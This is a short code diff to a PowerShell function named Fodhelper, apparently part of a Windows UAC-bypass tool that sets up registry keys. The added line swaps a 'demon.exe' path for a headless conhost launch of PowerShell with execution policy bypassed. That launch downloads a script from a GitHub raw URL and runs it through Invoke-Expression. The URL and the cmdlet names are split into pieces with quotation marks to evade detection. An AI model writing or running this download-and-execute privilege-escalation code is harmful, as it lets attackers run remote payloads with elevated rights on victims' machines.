@@ -1,7 +1,7 @@
 function Fodhelper(){ 
  Param (
            
-        [String]$program = "C:\Users\Public\demon.exe" 
+        [String]$program = "C:\Windows\System32\conhost.exe" -Argument "--headless powershell -exec Bypass -c `"`$l='http'+'s://raw.githubusercontent.com/jabdotNet/tests/main/x1.ps3';(i''wR -UseBasicParsing `$l).content|i''E''x`" 
        )
 　
     #Create Registry Structure
